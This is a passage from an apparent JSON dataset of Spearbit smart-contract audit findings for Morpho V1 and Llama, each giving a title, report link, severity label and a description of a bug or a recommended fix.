iterates over all user-entered markets and calls _getUserLiquidity- DataForAsset(poolToken) -> _getUserBorrowBalanceInOf(poolToken). However, it only updates the indexes of markets that correspond to the borrow and collateral assets. The _getUserBorrowBalanceInOf function computes the underlying pool amount of the user as userBorrowBalance.onPool.mul(lastPoolIndexes[_- poolToken].lastBorrowPoolIndex);. Note that lastPoolIndexes[_poolToken].lastBorrowPoolIndex is a value that was cached by Morpho and it can be outdated if there has not been a user-interaction with that market for a long time. The liquidation does not match Compound's liquidation anymore and users might not be liquidated on Morpho that could be liquidated on Compound. Liquidators would first need to trigger updates to Morpho's internal borrow indexes.", "labels": ["Spearbit", "MorphoV1", "Severity: Medium Risk"]}, {"title": "HeapOrdering.getNext returns the root node for nodes not in the list", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "If an id does not exist in the HeapOrdering the getNext() function will return the root node uint256 rank = _heap.ranks[_id]; // @audit returns 0 as rank. rank + 1 will be the root if (rank < _heap.accounts.length) return getAccount(_heap, rank + 1).id; else return address(0);", "labels": ["Spearbit", "MorphoV1", "Severity: Low Risk"]}, {"title": "Heap only supports balances up to type(uint96).max", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The current heap implementation packs an address and the balance into a single storage slot which If a token has 18 decimals, the largest restricts the balance to the uint96 type with a max value of ~7.9e28. balance that can be stored will be 7.9e10. This could lead to problems with a token of low value, for example, if 1.0 tokens are worth 0.0001$, a user could only store 7_900_000$.", "labels": ["Spearbit", "MorphoV1", "Severity: Low Risk"]}, {"title": "Delta leads to incorrect reward distributions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Delta describes the amount that is on the pool but still wrongly tracked as inP2P for some users. There are users that do not have their P2P balance updated to an equivalent pool balance and therefore do not earn rewards. There is now a mismatch of this delta between the pool balance that earns a reward and the sum of pool balances that are tracked in the reward manager to earn that reward. The increase in delta directly leads to an increase in rewards for all other users on the pool.", "labels": ["Spearbit", "MorphoV1", "Severity: Low Risk"]}, {"title": "When adding a new rewards manager, users already on the pool won't be earning rewards", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "When setting a new rewards manager, existing users that are already on the pool are not tracked and won't be earning rewards.", "labels": ["Spearbit", "MorphoV1", "Severity: Low Risk"]}, {"title": "liquidationThreshold computation can be moved for gas efficiency", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The vars.liquidationThreshold computation is only relevant if the user is supplying this asset. Therefore, it can be moved to the if (_isSupplying(vars.userMarkets, vars.borrowMask)) branch.", "labels": ["Spearbit", "MorphoV1", "Severity: Gas Optimization"]}, {"title": "Add max approvals to markets upon market creation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Approvals to the Compound markets are set on each supplyToPool function call.", "labels": ["Spearbit", "MorphoV1", "Severity: Gas Optimization"]}, {"title": "isP2PDisabled flag is not updated by setIsPausedForAllMarkets", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The current implementation of _setPauseStatus does not update the isP2PDisabled. When _- isPaused = false this is not a real problem because once all the flags are enabled (everything is paused), all the operations will be blocked at the root of the execution of the process. There might be cases instead where isP2PDisabled and the other flags were disabled for a market and Morpho want to enable all of them, resuming all the operations and allowing the users to continue P2P usage. In this case, Morpho would only resume operations without allowing the users to use the P2P flow. function _setPauseStatus(address _poolToken, bool _isPaused) internal { Types.MarketPauseStatus storage pause = marketPauseStatus[_poolToken]; pause.isSupplyPaused = _isPaused; pause.isBorrowPaused = _isPaused; pause.isWithdrawPaused = _isPaused; pause.isRepayPaused = _isPaused; pause.isLiquidateCollateralPaused = _isPaused; pause.isLiquidateBorrowPaused = _isPaused; // ... event emissions }", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Differences between Morpho and Aave liquidate validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logic Note: Morpho re-implements the liquidate function as a mix of  repay + supply operations on Aave executed inside _unsafeRepayLogic where needed  withdraw + borrow operations on Aave executed inside _unsafeWithdrawLogic where needed From _unsafeRepayLogic (repay + supply on pool where needed)  Because _unsafeRepayLogic internally call aave.supply the whole tx could fail in case the supplying has been disabled on Aave (isFrozen == true) for the _poolTokenBorrowed  Morpho is not checking that the Aave borrowAsset has isActive == true  Morpho do not check that remainingToRepay.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to repay that amount to Aave would make the whole tx revert 16  Morpho do not check that remainingToSupply.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to borrow that amount to Aave would make the whole tx revert From _unsafeWithdrawLogic (withdraw + borrow on pool where needed)  Because _unsafeWithdrawLogic internally calls aave.borrow the whole tx could fail in case the borrowing has been disabled on Aave (isFrozen == true or borrowingEnabled == false) for the _poolTokenCol- lateral  Morpho is not checking that the Aave collateralAsset has isActive == true  Morpho do not check that remainingToWithdraw.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to withdraw that amount from Aave would make the whole tx revert  Morpho do not check that remainingToBorrow.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to borrow that amount from Aave would make the whole tx revert More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Differences between Morpho and Aave repay validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logic Note: Morpho re-implement the repay function as a mix of repay + supply operations on Aave where needed  Both Aave and Morpho are not handling ERC20 token with fees on transfer  Because _unsafeRepayLogic internally call aave.supply the whole tx could fail in case the supplying has been disabled on Aave (isFrozen == true)  Morpho is not checking that the Aave market has isActive == true  Morpho do not check that remainingToRepay.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to repay that amount to Aave would make the whole tx revert  Morpho do not check that remainingToSupply.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to supply that amount to Aave would make the whole tx revert More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Differences between Morpho and Aave withdraw validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logic Note: Morpho re-implement the withdraw function as a mix of withdraw + borrow operations on Aave where needed  Both Aave and Morpho are not handling ERC20 token with fees on transfer  Because _unsafeWithdrawLogic internally calls aave.borrow the whole tx could fail in case the borrowing has been disabled on Aave (isFrozen == true or borrowingEnabled == false)  Morpho is not checking that the Aave market has isActive == true  Morpho do not check that remainingToWithdraw.rayDiv(poolIndexes[_poolToken].poolSupplyIndex) > 0. Trying to withdraw that amount from Aave would make the whole tx revert  Morpho do not check that remainingToBorrow.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to borrow that amount from Aave would make the whole tx revert Note 1: Aave is NOT checking that the market isFrozen. This means that users can withdraw even if the market is active but frozen More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Differences between Morpho and Aave borrow validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logics Note: Morpho re-implement the borrow function as a mix of withdraw + borrow operations on Aave where needed  Both Aave and Morpho are not handling ERC20 token with fees on transfer  Morpho is not checking that the Aave market has isFrozen == false (check done by Aave on the borrow operation), users could be able to borrow in P2P even if the borrow is paused on Aave (isFrozen == true) because Morpho would only call the aave.withdraw (where the frozen flag is not checked)  Morpho do not check if market is active (would borrowingEnabled == false if market is not active?)  Morpho do not check if market is frozen (would borrowingEnabled == false if market is not frozen?)  Morpho do not check that healthFactor > GenericLogic.HEALTH_FACTOR_LIQUIDATION_THRESHOLD  Morpho do not check that remainingToBorrow.rayDiv(poolIndexes[_poolToken].poolBorrowIndex) > 0. Trying to borrow that amount from Aave would make the whole tx revert More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Differences between Morpho and Aave supply validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between the logics Note: Morpho re-implement the supply function as a mix of repay + supply operations on Aave where needed  Both Aave and Morpho are not handling ERC20 token with fees on transfer  Morpho is not checking that the Aave market has isFrozen == false, users could be able to supply in P2P even if the supply is paused on Aave (isFrozen == true) because Morpho would only call the aave.repay (where the frozen flag is not checked)  Morpho is not checking if remainingToSupply.rayDiv( poolIndexes[_poolToken].poolSupplyIndex ) === 0. Trying to supply that amount to Aave would make the whole tx revert 19 More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Morpho should avoid creating a new market when the underlying Aave market is frozen", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "In the current implementation of Aave MorphoGovernance.createMarket the function is only check- ing if the AToken is in active state. Morpho should also check if the AToken is not in a frozen state. When a market is frozen, many operations on the Aave side will be prevented (reverting the transaction).", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Differences between Morpho and Compound liquidate validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. Note: Morpho liquidation does not directly call compound.liquidate but acts as a repay + withdraw operation. By reviewing both logic, we have noticed that there are some differences between the logic  Morpho does not check Compound seizeGuardianPaused because it is not implementing a \"real\" liquidate on compound, but it's emulating it as a \"repay\" + \"withdraw\".  Morpho should anyway monitor off-chain when the value of seizeGuardianPaused changes to true. Which are the scenarios for which Compound decides to block liquidations (across all cTokens)? When this happens, is Compound also pausing all the other operations?  [Open question] Should Morpho pause liquidations when the seizeGuardianPaused is true?  Morpho is not reverting if msg.sender === borrower  Morpho does not check if _amount > 0  Compound revert if amountToSeize > userCollateralBalance, Morpho does not revert and instead uses min(amountToSeize, userCollateralBalance) 20 More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Aave\".", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "repayLogic in Compound PositionsManagershould revert if toRepay is equal to zero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The current implementation of repayLogic is correctly reverting if _amount == 0 but is not reverting if toRepay == 0. The value inside toRepay is given by the min value between _getUserBorrowBalanceInOf(_- poolToken, _onBehalf) and _amount. If the _onBehalf user has zero debt, toRepay will be initialized with zero.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Differences between Morpho and Compound supply validation logic", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The Morpho approach is to mimic 1:1 the logic of the underlying protocol, including all the logic and sanity checks that are done before executing a user's action. On top of the protocol's logic, Morpho has its own logic. By reviewing both logic, we have noticed that there are some differences between them;  Compound is handling ERC20 tokens that could have transfer fees, Morpho is not doing it right now, see\"ERC20 with transfer's fee are not handled by PositionManager\".  Morpho is not checking if the underlying Compound market has been paused for the supply action (see mintGuardianPaused[token]). This means that even if the Compound supply is paused, Morpho could allow users to supply in the P2P.  Morpho is not checking if the market on both Morpho and Compound has been deprecated. If the deprecation flag is intended to be true for a market that will be removed in the next future, probably Morpho should not allow users to provide collateral for such a market. More information about detailed information can be found in the discussion topic \"Differences in actions checks between Morpho and Compound\".", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Consider creating a documentation that covers all the Morpho own flags, lending protocol's flags and how they interact/override each other", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Both Morpho and Aave/Compound have their own flags to check before allowing a user to interact with the protocols. Usually, Morpho has decided to follow the logic to map 1:1 the implementation of the underlying protocol validation. There are some examples also where Morpho has decided to override some of their own internal flags For example, in the Aave aave-v2/ExitPositionsManager.liquidateLogic even if a Morpho market has been flagged as \"deprecated\" (user can be liquidated without being insolvent) the liquidator would not be able to liquidate the user if the liquidation logic has been paused.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Missing natspec or typos in natspec", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "- Updated the natspec updateP2PIndexes replacing \"exchangeRatesStored()\" with \"exchangeRate- Stored()\"  Updated the natspec _updateP2PIndexes replacing \"exchangeRatesStored()\" with \"exchangeRateStored()\"  Updated the natspec for event MarketCreated replacing \"_poolToken\" with \"_p2pIndexCursor\"", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Removed unused \"named\" return parameters from functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Some functions in the codebase are defining \"named\" functions parameter that are not used explicitly inside the code. This could lead to future changes to return wrong values if the \"explicit return\" statement is removed and the function returns the \"default\" values (based on the variable type) of the \"named\" parameter.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Consider merging the code of CompoundMath libraries and use only one", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The current codebase uses libraries/CompoundMath.sol but there's already an existing solidity library with the same name inside the package @morpho-dao/morpho-utils For better code clarity, consider merging those two libraries and only importing the one from the external pack- age. Be aware that the current implementation inside the @morpho-dao/morpho-utils CompoundMath mul and div function uses low-level yul and should be tested, while the library used right now in the code use \"high level\" solidity. the", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Consider reverting the creation of a deprecated market in Compound", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Compound has a mechanism that allows the Governance to set a specific market as \"deprecated\". Once a market is deprecated, all the borrows can be liquidated without checking whether the user is solvent or not. Compound currently allows users to enter (to supply and borrow) a market. In the current version of MorphoGovernance.createMarket, Morpho governance is not checking whether a market is already deprecated on compound before entering it and creating a new Morpho-market. This would allow a Morpho user to possibly supply or borrow on a market that has been already deprecated by compound.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Document HeapOrdering", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Morpho uses a non-standard Heap implementation for their Aave P2P matching engine. The im- plementation only correctly sorts _maxSortedUsers / 2 instead of the expected _maxSortedUsers. Once the _maxSortedUsers is reached, it halves the size of the heap, cutting the last level of leaves of the heap. This is done because a naive implementation that would insert new values at _maxSortedUsers (once the heap is full) and shift them up, then decrease the size to _maxSortedUsers - 1 again, would end up concentrating all new values on the same single path from the leaf to the root node. Cutting off the last level of nodes of the heap is a heuristic to remove low-value nodes (because of the heap property) while at the same time letting new values be shifted up from different leaf locations. In the end, the goal this tries to achieve is that more high-value nodes are stored in the heap and can be used for the matching engine.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Consider removing the Aave-v2 reward management logic if it is not used anymore", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "If the current aave-v2 reward program has ended and the Aave protocol is not re-introducing it anytime soon (if not at all) consider removing the code that currently is handling all the logic behind claiming rewards from the Aave lending pool for the supplied/borrow assets. Removing that code would make the codebase cleaner, reduce the attack surface and possibly revert in case some of the state variables are incorrectly miss configured (rewards management on Morpho is activated but Aave is not distributing rewards anymore).", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Avoid shadowing state variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Shadowing state or global variables could lead to potential bugs if the developer does not treat them carefully. To avoid any possible problem, every local variable should avoid shadowing a state or global variable name.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational aave-"]}, {"title": "Governance setter functions do not check current state before updates", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "In MorphoGovernance.sol, many of the setter functions allow the state to be changed even if it is already set to the passed-in argument. For example, when calling setP2PDisabled, there are no checks to see if the _poolToken is already disabled, or does not allow unnecessary state changes.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Emit event for amount of dust used to cover withdrawals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Consider emitting an event that includes the amount of dust that was covered by the contract balance. A couple of ways this could be used:  Trigger an alert whenever it exceeds a certain threshold so you can inspect it, and pause if a bug is found or a threshold is exceeded.  Use this value as part of your overall balance accounting to verify everything adds up.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Break up long functions into smaller composable functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "A few functions are 100+ lines of code which makes it more challenging to initially grasp what the function is doing. You should consider breaking these up into smaller functions which would make it easier to grasp the logic of the function, while also enabling you to easily unit test the smaller functions.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Remove unused struct members", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The HealthFactorVars struct contains three attributes, but only the userMarkets attribute is ever set or used. These should be removed to increase code readability.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Remove unused struct", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "There is an unused struct BorrowAllowedVars. This should be removed to improve code readability.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "No validation check on prices fetched from the oracle", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Currently in the liquidateLogic function when fetching the borrowedTokenPrice and collateral- Price from the oracle, the return value is not validated. This is due to the fact that the underlying protocol does not do this check either, but the fact that the underlying protocol does not do validation should not deter Morpho from performing validation checks on prices fetched from oracles. Also, this check is done in the Compound PositionsManager.sol here so for code consistency, it should also be done in Aave-v2.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "onBehalf argument can be set as the Morpho protocols address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "When calling the supplyLogic function, currently the _onBehalf argument allows a user to supply funds on behalf of the Morpho protocol itself. While this does not seem exploitable, it can still be a cause for user error and should not be allowed.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "maxSortedUsers has no upper bounds validation and is not the same in Compound/Aave-2", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "In MorphoGovernance.sol, the maxSortedUsers function has no upper bounds limit put in place. The maxSortedUsers is the number of users to sort in the data structure. Also, while this function has the MaxSorte- dUsersCannotBeZero() check in Aave-v2, the Compound version is missing this same error check.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Consider adding the compound revert error code inside Morpho custom error to better track the revert reason", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "On Compound, when an error condition occurs, usually (except in extreme cases) the transaction is not reverted, and instead an error code (code !== 0) is returned. Morpho correctly reverts with a custom error when this happens, but is not reporting the error code returned by Compound. By tracking, as an event parameter, the error code, Morpho could better monitor when and why interactions with Compound are failing.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "liquidationThreshold variable name can be misleading", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The liquidationThreshold name in Aave is a percentage. The values.liquidationThreshold variable used in Morpho's _getUserHealthFactor is in \"value units\" like debt: values.liquidationThreshold = assetCollateralValue.percentMul(assetData.liquidationThreshold);.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Users can be liquidated on Morpho at any time when the deprecation flag is set by governance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "Governance can set a deprecation flag on Compound and Aave markets, and users on this mar- ket can be liquidated by anyone even if they're sufficiently over-collateralized. Note that this deprecation flag is independent of Compound's own deprecation flags and can be applied to any market.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "Refactor _computeP2PIndexes to use InterestRateModel's functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/MorphoV1-Spearbit-Security-Review.pdf", "body": "The InterestRatesManager contracts' _computeP2PIndexes functions currently reimplement the interest rate model from the InterestRatesModel functions.", "labels": ["Spearbit", "MorphoV1", "Severity: Informational"]}, {"title": "The castApprovalBySig and castDisapprovalBySig functions can revert", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "The castApprovalBySig and castDisapprovalBySig functions are used to cast an approve or disapprove via an off-chain signature. Within the _preCastAssertions a check is performed against the strategy using msg.sender instead of policy- holder, the strategy (e.g. AbsoluteStrategy) uses that argument to check if the cast sender is a policyholder. isApproval ? actionInfo.strategy.isApprovalEnabled(actionInfo, msg.sender) : actionInfo.strategy.isDisapprovalEnabled(actionInfo, msg.sender); While this works for normal cast, using the ones with signatures will fail as the sender can be anyone who calls the method with the signature signed off-chain.", "labels": ["Spearbit", "Llama", "Severity: Critical Risk"]}, {"title": "The castApproval/castDisapproval doesn't check if role parameter is the approvalRole", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "A policyholder should be able to cast their approval for an action if they have the approvalRole defined in the strategy. It should not be possible for other roles to cast an action. The _castApproval method verifies if the policyholder has the role passed as an argument but doesn't check if it actually has approvalRole which is eligible to cast an approval. This means any role in the llama contract can participate in the approval with completely different quantities (weights). The same problem occurs for the castDisapproval function as well.", "labels": ["Spearbit", "Llama", "Severity: Critical Risk"]}, {"title": "Reducing the quantity of a policyholder results in an increase instead of a decrease in totalQuan- tity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "In Llama policyholder can approve or disapprove actions. Each policyholder has a quantity which represents their approval casting power. It is possible to update the quantity of individual policyholder with the setRoleHolder function in the LlamaPolicy. The _setRoleHolder method is not handling the decrease of quantity correctly for the totalQuantity. The totalQuantity describes the sum of the quantities of the individual policyholders for a specific role. In the case of a quantity change, the difference is calculated as follows: uint128 quantityDiff = initialQuantity > quantity ? initialQuantity - quantity : quantity - ,! initialQuantity; However, the quantityDiff is always added instead of being subtracted when the quantity is reduced. This results in an incorrect tracking of the totalQuantity. Adding the quantityDiff should only happen in the increase case. See: LlamaPolicy.sol#L388 // case: willHaveRole=true, hadRoleQuantity=true newTotalQuantity = currentRoleSupply.totalQuantity + quantityDiff;", "labels": ["Spearbit", "Llama", "Severity: High Risk"]}, {"title": "LlamaPolicy.revokePolicy cannot be called repeatedly and may result in burned tokens retaining active roles", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Llama has two distinct revokePolicy functions. The first revokePolicy function removes all roles of a policyholder and burns the associated token. This function iterates over all existing roles, regardless of whether a policyholder still holds the role. In the next step the token is burned. If the total number of roles becomes too high, this transaction might not fit into one block. A second version of the revokePolicy function allows users to pass an array of roles to be removed. This approach should enable the function to be called multiple times, thus avoiding an \"out-of-gas\" error. An out-of-gas error is currently not very likely considering the maximum possible role number of 255. However, the method exists and could be called with a subset of the roles a policyholder. The method contains the following check: if (balanceOf(policyholder) == 0) revert AddressDoesNotHoldPolicy(policyholder); Therefore, it is not possible to call the method multiple times. The result of a call with a subset of roles would lead to an inconsistent state. The token of the policyholder is burned, but the policyholder could still use the remaining roles in Llama. Important methods like LlamaPolicy.hasRole don't check if LlamaPolicy.sol#L250) the token has been burned. (See", "labels": ["Spearbit", "Llama", "Severity: Medium Risk"]}, {"title": "Role, permission, strategy, and guard management or config errors may prevent creating/approving/queuing/executing actions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "LlamaCore deployment from the factory will only succeed if one of the roles is the BOOTSTRAP_ROLE. As the comments note: // There must be at least one role holder with role ID of 1, since that role ID is initially // given permission to call `setRolePermission`. This is required to reduce the chance that an // instance is deployed with an invalid configuration that results in the instance being unusable. // Role ID 1 is referred to as the bootstrap role. There are still several ways a user can misstep and lose access to LlamaCore.  Bootstrap Role Scenarios While the bootstrap role is still needed: 1. Setting an expiry on the bootstrap role's policyholder RoleHolderData and allowing the timestamp to pass. Once passed any caller may remove the BOOTSTRAP_ROLE from expired policyholders. 2. Removing the BOOTSTRAP_ROLE from all policyholders. 3. Revoking the role's permission with setRolePermission(BOOTSTRAP_ROLE, bootstrapPermissionId, false).  General Roles and Permissions Similarly, users may allow other permissions to expire, or remove/revoke them, which can leave the contract in a state where no permissions exist to interact with it. The BOOTSTRAP_- ROLE would need to be revoked or otherwise out of use for this to be a problem.  Misconfigured Strategies A misconfigured strategy may also result in the inability to process new actions. For example: 1. Setting minApprovals too high. 2. Setting queuingPeriod unreasonably high 3. Calling revokePolicy when doing so would make policy.getRoleSupplyAsQuantitySum(approvalRole) fall below minApprovals (or fall below minApprovals - actionCreatorApprovalRoleQty). 1 & 2 but applied to disapprovals. And more, depending on the strategy (e.g. if a strategy always responded true to isActive).  Removal of Strategies It should not be possible to remove the last strategy of a Llama instance It is possible to remove all strategies from an Ilama instance. It would not be possible to create a new action afterward. An action is required to add other strategies back. As a result, the instance would become unusable, and access to funds locked in the Accounts would be lost.  Misconfigured Guards An accidentally overly aggressive guard could block all transactions. There is a built-in protection to prevent guards from getting in the way of basic management if (target == address(this) || target == address(policy)) revert CannotUseCoreOrPolicy();. Again, the BOOTSTRAP_ROLE would need to be revoked or otherwise out of use for this to be a problem.", "labels": ["Spearbit", "Llama", "Severity: Medium Risk"]}, {"title": "LlamaPolicy.hasRole doesn't check if a policyholder holds a token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Incorrect usage of the revokePolicy function can result in a case, where the token of a policyholder is already burned but still holds a role. The hasRole function doesn't check if in addition to the role the policyholder still holds the token to be active. The role could still be used in the Llama system.", "labels": ["Spearbit", "Llama", "Severity: Medium Risk"]}, {"title": "Incorrect isActionApproved behavior if new policyholders get added after the createAction in the same block.timestamp", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "Llama utilizes Checkpoints to store approval quantities per timestamp. If the current quantity changes, the previous values are preserved. The block.timestamp of createAction is used as a snapshot for the approval. (See: LlamaCore.sol#L597) Thus, in addition to the Checkpoints, the totalQuantity or numberOfHolders at the createAction are included in the snapshot. However, if new policyholders are added or their quantities change after the createAction within the same block.timestamp, they are not considered in the snapshot but remain eligible to cast an approval. For example, if there are four policyholders together 50% minimum approval: If a new action is created and two policyholders are added subsequently within the same block.timestamp. 9 The numberOfHolders would be 4 in the snapshot instead of 6. All 6 policyholders could participate in the approval, and two approvals would be sufficient instead of 4. Adding new policyholders together with creating a new action could happen easily in a llama script, which allows to bundle different actions. If a separate action is used to add a new policyholder, the final execution happens via a public callable function. An attacker could exploit this by trying to execute the add new policyholder action if a new action is created", "labels": ["Spearbit", "Llama", "Severity: Medium Risk"]}, {"title": "LlamaCore delegate calls can bring Llama into an unusable state", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Security-Review.pdf", "body": "The core contract in Llama allows the execution of actions through a delegate_call. An action is executed as a delegate_call when the target is added as an authorizedScript. This enables batching multiple tasks into a contract, which can be executed as a single action. In the delegate_call, a script contract could modify arbitrary any slot of the core contract. The Llama team is aware of this fact and has added additional safety-checks to see if the slot0 has been 